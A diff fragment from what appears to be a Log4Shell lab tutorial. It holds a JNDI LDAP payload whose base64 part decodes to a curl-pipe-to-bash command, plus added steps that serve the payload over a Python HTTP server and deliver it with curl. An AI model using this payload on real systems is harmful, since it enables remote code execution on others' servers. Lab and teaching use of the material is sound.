@@ -69,8 +69,15 @@ JChjdXJsIDE5Mi4xNjguMS42OjgwODV8YmFzaCk=
 ${jndi:ldap://192.168.1.6:6389/JChjdXJsIDE5Mi4xNjguMS42OjgwODV8YmFzaCk=}
 ``` 
 
+6. Now open a new terminal window and inside the shells directory run the following command in order to start a python simple HTTP server
 
-6. Now that the ```logging-log4j2``` application runs, use the ```curl``` command line tool in order send the jndi payload as shown below 
+```
+cd sshells 
+python3 -m http.server 8085
+
+```
+
+7. Now that the ```logging-log4j2``` application runs, open a new terminal window and run the ```curl``` command line tool in order to send the jndi payload as shown below 
 (change the IP address with the one that suits to your environment) 
 
 ```
